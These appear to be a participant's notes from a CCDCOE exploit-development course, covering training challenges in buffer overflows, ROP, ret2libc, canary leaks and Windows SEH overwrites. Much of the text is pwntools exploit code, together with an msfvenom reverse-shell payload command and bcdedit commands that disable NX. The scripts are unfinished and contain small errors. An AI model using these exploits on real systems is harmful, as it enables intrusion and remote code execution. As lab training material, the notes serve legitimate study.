---
description: EST, Tallin, 17.-21.6.2024
---

# Exploits Advanced (EXA)

* my VPN IP: 10.85.7.45
* Ubuntu machine: 10.140.121.24
* Kali machine: 10.140.122.24
* Win dev machine: 10.140.123.24

Webpages:

* CTFd platform: [https://exa-ctfd.tech.ccdcoe.org/](https://exa-ctfd.tech.ccdcoe.org/)
* Libc DB search: [https://exa-libc.tech.ccdcoe.org/](https://exa-libc.tech.ccdcoe.org/)

***

## DEBUGGING

* gdb ./program run (runs the programme)&#x20;
* start (runs + breaks at the main() func)&#x20;
* si (single instr ... instrukce po instrukci, vnorim se do loopu)&#x20;
* ni (next instr ... step over pres loop na dalsi funkci)&#x20;
* break or 'b' (pridam breakpoint)&#x20;
* hb (hardware breakpoint ... limited up to cca 16pcs)&#x20;
* delete (vymazu breakpoint)&#x20;
* disassemble (disass specific mem section)&#x20;
* x (examine mem)&#x20;
* continue or 'c'

Another cool stuff:

* msf-pattern\_create -l \<length>
* msf-pattern\_offset -q \<query>

***

## 01 - BUFFER OVERFLOW&#x20;

### S1: Get the offset to overwrite the EIP register

* Terminal - SSH to 10.140.121.24&#x20;
* VS Code - Green left-down - Connect to Host - student@10.140.121.24 template - exploit.py (we can try touch exploit.py in terminal after saving in VS Code if SSH remote instance works well...)&#x20;
* Terminal - 'tmux'&#x20;
  * 'gdb chal-elf\_01' -> gef -> pattern create 350&#x20;
    * \- saved as $\_gef0&#x20;

<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>generating the pattern for offset recognition</p></figcaption></figure>

* run&#x20;
  * paste the generated pattern&#x20;
    * we reached the segmentation fault - now we can see which part of AAAAAAs arrived to instruction pointer (raac)&#x20;
  * pattern offset raac - it is value 268 (big-endian) - we dont actually need to count it manually, just call the address of eip&#x20;
    * pattern offset $eip&#x20;
      * **268**
* modify exploit.py - 268:&#x20;
  * line 15: offset = b"A"\*268

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

```python
from pwn import *

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('buffer_overflow')        # add file name
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

offset = b"A"*268                                        # offset

buffer = offset


io.sendline(buffer)
io.interactive()
```

### S2 - Find all the badchars

To find all badbytes, we have to send all possible values and check manually, if they end up on the stack and that they don't break our exploit.

```python
badchars = (
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

Send them after the EIP overwrite and check in the debugger. Once the execution stops because of the segmentation fault, ESP will point to the badchars-Array. We can now go through all the bytes until we reach some badbyte or the final value of 0xff.

```bash
gef➤
x/c $esp
0xffc3a4a0:    0x1
gef➤
0xffc3a4a1:0x2
[...]
```

Or you can display the whole array with also specifying a size value:



* "checksec buffer\_overflow"
* "ropper"
  * "file buffer\_overflow"
* bad buffer addresses
  * 0x00 also, dont forget it
* buffer = offset +
  * Im controlling saved BBBs +
* good func in gef called x (examinate)
  * gef - x/c $esp
    * I wanna see hexadecimal 0x1
    * weird is that after 0x09 and 0x0a should come 0x0b
      * but there is 0x00
        * b was incorrect guess
          * lets try close positioned (0x0a or 0x0c)
* we can see that address values change... because of
  * we need to find some cool address where to jump next...
    * edit py script w bufs
* python3 exploit.py GDB
  * c
  * x/c $esp
* **\x00\x0a\x17\xcb**
  * ANSWER FOR 02
* define var
  * gadget = b"\x03\x85\x04\x08"
    * start from end (little endianess) ... 08 04 85 03
* python3 exploit.py GDB
  * b \*0x80405830
  * ni
  * inc ebx
* nop = b"\x90"
  * x90 is always for nop instruction...
  * we use it because it would destroy our obtained shell...
* buffer = offset + gadget + nop \*25 + buf
* on kali - MSFCONSOLE -Q
  * set payload linux/x86/meterpreter/reverse\_tcp
  * set LHOST IP
* after obtaining reverse shell from kali...
  * we can change exploit script from GDB to REMOTE
    * edit IP address from CTFd challenge and obtain connection...there is a flag.txt

WRITEUP

* checksec buffer\_overflow
  * we need to find gadget ESP
    * there is NO PIE (code segment is NOT randomized mem address, only stack pointers)
* pattern create 300
  * copy
* run
* c
* pattern offset $eip
* go to exploit
  * offset = b"A"\*268 (obtained eip address)
  * badbytes
    * 0x00 and 0x0a are often bad bytes
* ldd
  * addresses change
  * LSAP seems to be enabled
    * sudo cat /proc/sys/kernel/randomize\_va\_space
      * 0 means disabled, 1/2 means enabled (we have 2)
    * we can disable, but it then wont work on remote host

### S3: Obtain the address for the 'jmp esp' gadget

* ropper
  * file buffer\_overflow
    * help
    * search jmp esp
      * **0x08048503**

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

### S4: Execute the exploit to the remote target and find the content of flag.txt

* lets craft the obtained jmp esp address in little endianess (from back to front)
* edit exploit python
  * gadget = p32(0x08048503)
    * or: gadget = b"\x03\x85\x04\x08"
* Kali machine
  * msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=10.140.122.24 LPORT=4444 -f python -b "\x00\x0a\x17\xcb"
* Dev nachime
  * msfconsole -q
    * add settings (LHOST etc)
* REMOTE
  * add remote IP address (line 7)
* after obtaining reverse shell - ANSWER FOR 04 - flag.txt there



Theory x32 / x64

* double address size
* other address syntax (x64 rax, rbx...)
* another function call syntax
* x64 - 00 bytes are dangerous

## 02 - Arguments\_32

### S1: Get the offset to overwrite the EIP register

* ./arguments\_32
  * If I write some string, it outputs the same string...
* checksec arguments\_32
  * Arch i386-32-little, Partial RELRO, NO Stack, NX enabled, NO PIE
* gdb arguments\_32
  * info functions
    * functions: flag, vuln, main...
  * b flag, b vuln, b main
  * c...
    * goes to vuln, then to main...not flag
    * we need to find a good offset and then to fill correct data to obtain flag
  * pattern create 350
    * copy it
  * run
    * paste it as an input for program
  * c
    * SIGSERV
    * $eip
      *
    * stops at 192
      * offset = b"A"\*192

### S2: Base address of useful function flag

* after running with given offset, pointer gets BBBBs
  * breakpoints
    * b vuln
    * b main
    * b flag
      * copz flag address
        * 0x080485a6
          * flag = p32(0x080485a6)

### S3: Find the correct arguments in order

* flag function
  * disassemble flag()
  * we can see it compares some values...if exual it popsup flag, but it is not same value...
    * we must manage to get is equal
  * flag.txt read function
  * then it compares with value flag+144, if equal, I get the flag...
    * in the same folder, there is ho flag.txt file...it compares with 0 value
      * lets create file flag.txt
        * echo "Hello EXA" > flag.txt
  * 1st ARG: now Im in flag function...calling fopen with arg "r" (read)
    * NOT TAKEN - done well
  * 2nd ARG: compare function
    * x $ebp+0x8
    * this jmp is TAKEN - we run out of flag func...we must add condition to obtain equal cmp value...
      * modify exploit: buffer = offset + gadget + b"BBBB" + b"CCCC" + b"DDDD"
    * after running GDB - x $ebp+0x0
      * we have 43434343...CCCC which is correct, but we expected BBBB
      * lets add the EEEEs also
        * buffer = offset + gadget + b"BBBB" + b"CCCC" + b"DDDD" + b"EEEE"
    * instead of Cs, Ds and Es we make the correct addresses...
      * cmp func, there is je (flag+144) with 0x8048636 address
      * fgets ... call 0x8048430
      * cmp, there is jne (flag+192) with 0x8048666 address
  * 3rd ARG: fgets
  * these flag func has 3 ARGS and checks if they are:
    * 0xcbcbcbcb , 0x1ccdc0e1 and 0xdeadc0de

TUESDAY ROP and ret2libc

* Return Oriented Programming
* instead of placing executable code to stack we will navigate stack to our controlflow
* why was ROP created?
  * in OS executing some shell code in stack/memory is forbidden...
* NX = non-executable
* ret2libc
  * we dont need own shellcode...
  * available at all Linuxes

### S4: Execute the exploit to the remote target and find the content of flag.txt



***

## 03 - Arguments\_64

### S1: Get the offset to overwrite

### S2: Base address of useful function flag

### S3: Find the correct arguments in order

### S4: Which register do you have to use to pass the 3rd argument?

### S5: Execute the exploit to the remote target and find the content of flag.txt



* checksec arguments\_64
  * NX enabled
  * amd64-64-little
* ./arguments\_64
  * What program does: repeats the input
  * lets try AAAAAAAs
    * "command not found"
* gdb
  * create pattern 350
  * run
  * enter the pattern
  * in SIGSERVs at some vuln+0058
    * 64-bit architecture stops one step before end of programme, but at least shows the pre-last address
  * pattern offset $rsp
    * 200
  * info functions
    * flag, vuln, main
    * add them to breakpoints & run
      * main -> vuln -> exits
        * doesnt execute flag func..lets manipulate the programme to execute flag func
        * flag address: 0x0000000000400717
          * flag\_function = p64(0x400717)
            * now we can breakpoint into flag fulc
    * disassemble flag
  * now find the 3 arguments to call correctly to run the flag function
    * flag function
      * info functions => disassemble flag
        * <+71> movabs rax,0xcbcbcbcbcbcbcbcb
          * 0x40075e
        * <+87> movabs rax,0x1ccdc0e11ccdc0e1
          * 0x40076e
        * <+103> movabs rax,0xdeadc0dedeadc0de
          * 0x40077e => answer for Step3 ... arguments
      * $rdi
      * $rsi
      * $rdx => answer for Step4 ... register to pass the 3rd argument
    * NOT/TAKEN steps:
      * je 0x4007b8
      * jne 0x4007e1
    * to be able to modify it, it has to have file to write flag into...
      * nano flag.txt ... write sth there
* REMOTE
  * IP: 10.140.103.24, PORT: 9999
  * python3 exploit.py REMOTE
    * it prints out the flag in terminal...

***

```
- INFO:
	- in 64-bit we are to overwrite RETURN ADDRESS, not instruction pointer
		- 64-bit arch VERIFIES instruction pointer address before it jumps there
			- thats why only manipulating ISP value would be enough...
- now we are to modify 3 found flag args ($rdi $rsi $rdx)
- ropper
	- file arguments_64
	- search pop rdi
		- pop rdi;ret; 
		- 0x4008f3
	- search pop rsi
		- pop rsi;pop r15;ret;
		- 0x4008f1
		- Good, BUT we have also some r15 there...
- ropper -f arguments_64 | grep rdx
	- 0x4007b8 xchg rdx, rax; pop rax; ret;
	- lets figure out the pop rax also
- ropper
	- search pop rax
		- pop rax;ret;
		- 0x4007ba
- now we have everything
```

## 04 - ROP-shell

### S1: Get the offset to overwrite the EIP register

### S2: Which is the base address of the .bss section of executable

### S3: Search the writewhatwhere address gadget

### S4: To setup eax register, which other gadget do you need apart from the 'pop eax; ret;'? Write the address

### S5: Execute the exploit to the remote target and find the content of flag.txt

* gdb rop-shell
  * info functions
    * in main: fopen, strncpy...then gmon start
  * pattern create
    * msf-pattern\_create -l 500
      * we add the generated string into exploit.py -> offset
        * offset =b"Aa0Aa1Aa2..."
    * afterwards $eip address in debugger...
      * 0xf7fa9830
        * x/c $eip
          * 0x89
            * offset is 412
  * base address of the .bss section of executable
    * objdump rop-shell -h | grep ".bss"
      * 0x0804a02c
  * search the writewhatwhere address gadget
    * we wanna run system interrupt (by default 0x80)
      * google: linux syscalls
        * x86 (32-bit)
          * 11 execve (eax has to be 0x0b)
  * ropper; file rop-shell
    * search mov
      * mov dword ptr \[ebp - 0xc], eax; cmp dword ptr \[ebp - 0xc], 0; je 0x597, ret;
      * we add it to code
        * 0x0804858c
        * write = p32(0x0804858c)
        * also an snwser for Step3 - Search the writewhatwhere address gadget
    * search pop eax
      * pop eax;ret;
      * we add it to code
        * 0x08048556
        * write = p32(0x08048556)
    * search add eax
      * add eax,0x1ab2;int 0x80;
      * 0x0804854e
        * answer for Step 4 - Which other gadget do zou need apart from pop eax ret...
    * search pop ebx
      * pop ebx;ret;
      * we add it to code
        * 0x080483a9
    * search pop ecx
      * pop ecx;ret;
      * we add it to code
        * 0x08048558
    * search xor
      * xor edx, edx;ret;
      * we add it to code
        * 0x0804855a
* REMOTE target attack
  * IP: 10.140.104.24, PORT: 9999
  *

***

ROP from Shellcode to Kernel

* betweel shellcode and kernel, there is a level that verifies if the program is permitted to access kernel...
  * there are INT (interrupt) codes, for example INT 80
  * we need to deliver correct ARGS, for example /bin/sh...
  * after correct args we obtain as answer from Kernel EAX and stuff...
* mov dword ptr \[eax], ebx ret

***

WEDNESDAY&#x20;

## 05 - Leak\_libc

* GOAL: leak the address of libc to bypass ASLR

### S1: Get the PW

* Open ghidra - initial analysis:
  * x86 processor, little endiann, executable,
  * Symbol tree - a lot of funcs
    * menu
      * few case options
        * none of them is interesting, maybe the case 2
          * two local vars, but we dont have control over them...
        * case 3
          * PW...reverse engineering to obtain it
          * void change\_pw(void)
            * lets find how to access this function
            * looks like XOR ...
              * if we find local\_10 and do XOR with local\_98 we should obtain PW
* gdb leak\_libc
  * set breakpoints to try to reach close to func
  * info functions
    * change\_pw
      * 0x400992
  * disassemble change\_pw
  * b change\_pw
  * run
    * we can see the string
      * RAX is 22...
        *   lets dcode it -> XOR over the string with 22

            * (cyberchef, dcode.fr...)

            <figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption><p>rax + string to process XOR</p></figcaption></figure>

            <figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption><p>Step1 Answer</p></figcaption></figure>
* Theory
  * ASLR
    * Address Space Layout Randommization
    * how to bypass - 3 ways
      * brute force
      * partial overwrite
      * mem leak
        * leak some func addr -> subtract the offset to the base of the lib -> add the offset of any func in that lib...

### S2: Get the offset to overwrite

* modify the exploit code a little...
* use gdb gef to generate a pattern
  * pattern create 350
  * pattern offset $rsp
    * **72**
      * answer for Step2

```python
from pwn import *
#from sol import OFFSET

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

# BIN INFO (checksec)
    # Arch: amd64-64-little
    # RELRO: Partial RELRO
    # Stack: No canary found
    # NX: NX enabled
    # PIE: No PIE (0x400000)

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_libc')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

io.sendline(b"3")
io.recvuntil("Please enter old password: ")
io.sendline("EXACourse")

rop = b""
rop += b"A"*72

io.sendline(rop)
io.interactive()
```



### S3: Address of PUTS@PLT&#x20;

### S4: Address of PUTS@GOT

* we need actually more args...to add via rop
  * puts\_plt = p64() # address&#x20;
  * puts\_got = p64() # argument&#x20;
  * pop\_rdi = p64() # instruction
*   puts\_plt

    * gdb leak\_libc -> info functions
      * **0x4006e0** puts@plt

    <figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
* puts\_got
  *
* pop\_rdi
  * ropper -> file leak\_libc -> search pop rdi
    * 0x400c93: pop rdi;ret;

```python
from pwn import *
#from sol import OFFSET

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

# BIN INFO (checksec)
    # Arch: amd64-64-little
    # RELRO: Partial RELRO
    # Stack: No canary found
    # NX: NX enabled
    # PIE: No PIE (0x400000)

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_libc')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

io.sendline(b"3")
io.recvuntil("Please enter old password: ")
io.sendline("EXACourse")

puts_plt = p64(0x4006e0)    # address
puts_got = p64(0x602028)    # argument
pop_rdi = p64(0x400c93)     # instruction

rop = b""
rop += b"A"*72
rop += pop_rdi      # instruction
rop += puts_got      # argument
rop += puts_plt      # address

io.sendline(rop)
io.interactive()
```

### S5: Get the libc offset for the symbol '/bin/sh' of the remote (IP: 10.140.105.X - Port: 9999) libc library with respect puts

* first part - obtaining putts\_address

```python
from pwn import *
#from sol import OFFSET

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

# BIN INFO (checksec)
    # Arch: amd64-64-little
    # RELRO: Partial RELRO
    # Stack: No canary found
    # NX: NX enabled
    # PIE: No PIE (0x400000)

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_libc')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

io.sendline(b"3")
io.recvuntil("Please enter old password: ")
io.sendline("EXACourse")

puts_plt = p64(0x4006e0)    # address
puts_got = p64(0x602028)    # argument
pop_rdi = p64(0x400c93)     # instruction: pop rdi;ret;

rop = b""
rop += b"A"*72
rop += pop_rdi      # instruction
rop += puts_got      # argument
rop += puts_plt      # address

io.sendline(rop)
io.recvline()
io.recvuntil("Please enter new password: ")
io.recvline()
io.recvline()

received = io.recvline()[:-1]
# Convert to little endian
puts_addr = int.from_bytes(received, "little")
info(f"Puts_addr @ libc: {hex(puts_addr)}")
'''
Obtained as GDB output
0x7f285d873e50
'''

#io.sendline(rop)
io.interactive()
```

* Obtained puts\_addr:
  * ```
    0x7f285d873e50
    ```
  * according to the libc DB search ([https://exa-libc.tech.ccdcoe.org/](https://exa-libc.tech.ccdcoe.org/))
    * I searched for puts with offset ending "e50"
      * from Matches I used ubuntu3.8...because:
        * ldd leak\_libc

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

* it means => for second part (crafting loop to obtain REMOTE address - ...e50 is only LCOAL one) we need to move to system (== /bin/sh) -> we are to modify code with Difference -0x300e0 for system w connection to puts we got...

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

* second part - crafting loop\_function&#x20;
  * loop\_func = p64() && rop1 += loop\_func
  * we need to find out the loop\_address, which is 1st in stack of change\_pw func...
    * gdb leak\_libc
      * disassemble change-pw
        * 0x400992 push rbp

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```python
from pwn import *
#from sol import OFFSET

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

# BIN INFO (checksec)
    # Arch: amd64-64-little
    # RELRO: Partial RELRO
    # Stack: No canary found
    # NX: NX enabled
    # PIE: No PIE (0x400000)

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_libc')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

io.sendline(b"3")
io.recvuntil("Please enter old password: ")
io.sendline("EXACourse")

puts_plt = p64(0x4006e0)    # address
puts_got = p64(0x602028)    # argument
pop_rdi = p64(0x400c93)     # instruction: pop rdi;ret;
loop_func = p64(0x400992)   # instruction: push rbp (obtained from disasembled change_pw in gdb)

offset = 72

rop1 = b""
rop1 += b"A" * offset
rop1 += pop_rdi      # instruction
rop1 += puts_got      # argument
rop1 += puts_plt      # address
rop1 += loop_func
io.sendline(rop1)

io.recvline()
io.recvuntil("Please enter new password: ")
io.recvline()
io.recvline()

received = io.recvline()[:-1]

# Convert to little endian
puts_addr = int.from_bytes(received, "little")
info(f"Puts_addr @ libc: {hex(puts_addr)}")
'''
Obtained as GDB output
0x7f22f743c980
'''
# Get
#system_offset = -0x300e0 # Local
system_offset = -0x2b4f0 # Remote
system_addr = puts_addr + system_offset

#str_bin_sh_offset = 0x157828 # Local
str_bin_sh_offset = 0x11e6b1 # Remote
str_bin_sh_addr = puts_addr + str_bin_sh_offset

rop2 = b""
rop2 += b"A" * offset
rop2 += pop_rdi
rop2 += p64(str_bin_sh_addr)
io.sendline(rop2)

io.interactive()

# puts_addr 0x7f22f743c980
```

*   **OK we obtained important stuff for answering S5 and S6...**



    * after obtaining puts\_addr with changed local addresses after offseting e50...
      * 0x7f9b68f50980

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

* puts 980 -> str\_bin\_sh
  * **0x11e6b1**

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### S6: remote system address

* puts 980 -> system
  * **0x2b4f0**

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### **S7: remote connection**

* OK, to sum up:
  * now we have the libc offset for the symbol /bin/sh and system -> ASLR bypass done
* add remote IP and PORT:&#x20;

## 06 - Leak\_Canary

Canary is easily said additional security layer in stack (above Stack EBP and below DATA)

Programme checks if the canary changed or not...

### S1: Offset

1. Lucky manually obtained

* Ghidra - function that displays \[**88**]

2. Breakpoint

* pattern create 300
* b 0x400797
  * breakpoint at xor rax, QWORD...ending of Canary
* run
* c
* c
* pattern offset $rax
  * **88**

### S2: Where is the canary?

* gdb leak\_canary
  * info functions
    * disassemble vuln
      * SETTING UP THE CANARY
        * \+8 and +11 (mov DWORD PTR... and mov rax, QWORD PTR...)
      * VERIFYING IF CANARY IS GOOD VALUE
        * \+160 and +164 (mov rax, QWORD... and xor rax, QWORD...)
      * \+ we can see between, that it does printf@plt&#x20;
        * in documentation of Canary...
          * we can bruteforce Canary by:
            * %X$p

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* Loop for trying to bruteforce the canary

```python
from pwn import *

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_canary')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

for i in range(1,30):
    io.recvuntil(f"This is try nr {i} \n")
    io.sendline(f"%{i}$p")

#io.sendline(buffer)
io.interactive()
```

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

* Lets verify it by running the exploit...
  * NO 19 looks interesting...looks like our canary
    * 0x70ee2035cc3dfd00
    * Answer for S2: **%19$p**

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

### S3: Address of PUTS@PLT

* gdb leak\_libc
  * info functions
    * second one...
      * **0x4005b0**

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

* second option
  * gdb leak\_libc
    * start
    * disas main
      * there it is also...

### S4: Address of PUTS@GOT

* PUTS@GOT is just a pointer to PUTS@PLT...
  * and PUTS@PLT is also a pointer to somewhere...
  * which means PUTS@GOT is a pointer to pointer...
*   we have 2 possibilities how to obtain that:



1.  Breakpoint to a pointer of puts@plt



* gdb leak\_canary
  * disas main
  * b \*0x4007bc
  * c
    * now we are in puts@plt

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

* si
  * we obtained puts@got.plt....
    * 0x601018

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

2. got command

* gdb leak\_canary
  * start
  * disas main
    * got
    * here we go, easy as it is...
      * 0x601018

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

* Additional step:
  * find also pop\_rdi address, we will need it
    * ropper -> file leak\_canary -> search pop rdi
      * 0x400853
        *

            <figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

After obtaining S4, here is how the exploit looks like now:

```python
from pwn import *

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_canary')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

'''
Loop for obtaining Canary by brute-forcing:
for i in range(1,30):
    io.recvuntil(f"This is try nr {i} \n")
    io.sendline(f"%{i}$p")
'''    
'''
Obtained Canary address:
0x70ee2035cc3dfd00
'''
#Ziskani aktualniho Canary (dynamicky se alokuje) + jeho vypis
io.recvuntil("This is try nr 1 \n")
io.sendline(b"%19$p")
canary = io.recvline()[:-1]
info(f"Canary: {canary}")

junk = b"A" * 88
rbp_junk = b"B" * 8

# Addresses
puts_plt = p64(0x4005b0)
puts_got = p64(0x601018)    
pop_rdi = p64(0x400853)     # pop rdi;ret;

rop = b""
rop += pop_rdi
rop += puts_got
rop += puts_plt

buffer = junk + p64(int(canary, base=16)) + rbp_junk + rop

io.sendline(buffer)

# Processing the leaked puts address
io.recvline()
received = io.recvline()[-7:-1]
puts_leaked = int.from_bytes(received, "little")
info(f"PUTS @ GOT: {hex(puts_leaked)}")

## Ret2libc

# Compute system and /bin/sh address


io.interactive()


```

### S5: libc offset for the func 'system' of the local libc lib

* actually same as for the previous challenge (05 Leak Libc)
  * because puts ands with offset e50 also...
    * [https://libc.rip/](https://libc.rip/)

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* system local Difference:
  * \-0x300e0

### S6: libc library version that is being used on the remote target

* Last one from the list...after obtaining offset change from e50 to 980 with rop1

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

* **libc6\_2.36-9+deb12u7\_amd64**

### **S7:** Execute the exploit to the remote target and find the content of flag.txt



## 07 - SEH&#x20;

**xDBG Theory**

* mostly we will use:
  * CPU, Log, Breakpoints, Mem, **SEH...**

**Network scheme:**

* PC -> SSH to Ubuntu dev machine for VScode
* PC -> Reminna RDP to WIN machine for x32dbg

### S1: Offset until SEH Handler-addr is overwritten

* first what arch is this file...
  * PE32, lets use x32dbg

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

```python
from pwn import *

context.log_level = 'debug'
io = remote("10.140.123.24", 80)            # connection to our Win DBG machine

# try some offset...
offset = b"A"*1000

buffer = offset

io.sendline(buffer)
io.interactive()

# NX Disable/Enable (in WIN PS w admin rights):
#   - Disable: 'bcdedit.exe /set nx AlwaysOff'
#   - Enable: 'bcdedit.exe /set nx AlwaysOn'
```

* Run the .exe w double/clink in Windows
* Open the file in x32dbg
* Run the script in SSH Ubuntu dev...



* Go to x32dbg -> 1x Continue -> in CPU registers EIP -> right-click COPY VALUE (17071ADF)
* terminal: msf-pattern\_offset -q 0x17071ADF
  * **676**

### S2: PopPopRet (PPR) gadget address

* IDK how to find it in x32dbg, searching doesnt work as expected
* Ropper
  * file EXA-SEH.exe
    * search pop
      * we are looking for pop pop ret
        * **0x17071688**

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

```python
from pwn import *

context.log_level = 'debug'
io = remote("10.140.123.24", 80)        # connection to our Win DBG machine


offset = b"A"*676                       # offset from S1
pop_pop_ret = p32(0x17071688)               # first pop-pop-ret

buffer = offset + pop_pop_ret

io.sendline(buffer)
io.interactive()

# NX Disable/Enable (in WIN PS w admin rights):
#   - Disable: 'bcdedit.exe /set nx AlwaysOff'
#   - Enable: 'bcdedit.exe /set nx AlwaysOn'
```

### S3: Exact MEM size in bytes, available right after the PopPopRet gadget to include a possible reverse shell code

* **1**52
  * important value, because we now know how much we should jump front and back...

### S4: Execute the exploit to the remote target and find the content of flag.txt

* cool tool for viewing how does CPU translate instruction to opcode...
* [rasm2](https://r2wiki.readthedocs.io/en/latest/tools/rasm2/)
  * rasm2 -C "INSTRUCTION"
    * output -> "\xXX\xXX\xXX\xXX"

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

* Our goal:
  * we have the pop-pop-ret address... in x32dbg we can see that (0x17071688), it continues w a lot of boring stuff... we wanna see the resulting EIP register value...
    * lets jump 20 steps to the future
      * figure out "jmp 20" opcode value
      * rasm2 -C "jmp 20"
        * \xeb\x12
          * in exploit:&#x20;
            * jmp\_front = p32(b"\xeb\x12\x90\x90")        # jmp 20 + padding
    * then we need to jump back... we know we have 676 offset + about 1650 bytes of data...
      * 600 could be enough
      * rasm2 -C "jmp -600"
        * \xe9\xa3\xfd\xff\xff
          * in exploit:
            *

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption><p>jmp_front by 20</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption><p>jmp_back by 600</p></figcaption></figure>

```python
from pwn import *

context.log_level = 'debug'
io = remote("10.140.123.24", 80)            # connection to our Win DBG machine 

offset = 676                                # offset from S1
junk = b"A" * (offset - 4) 
junk2 = b"C" * 400  
pop_pop_ret = p32(0x17071688)               # first pop-pop-ret (pop ecx;pop ecx;ret)
jmp_front = b"\xeb\x12\x90\x90"             # jmp 20 + padding (random shit)
jmp_back = b"\xe9\xa3\xfd\xff\xff"          # jmp -600
nop = b"x\90" * 25                          # nop instruction to probihit doing instructions for 25 times

buffer = junk + jmp_front + pop_pop_ret + nop + jmp_back + junk2

io.sendline(buffer)
io.interactive()

# NX Disable/Enable (in WIN PS w admin rights):
#   - Disable: 'bcdedit.exe /set nx AlwaysOff'
#   - Enable: 'bcdedit.exe /set nx AlwaysOn'

```

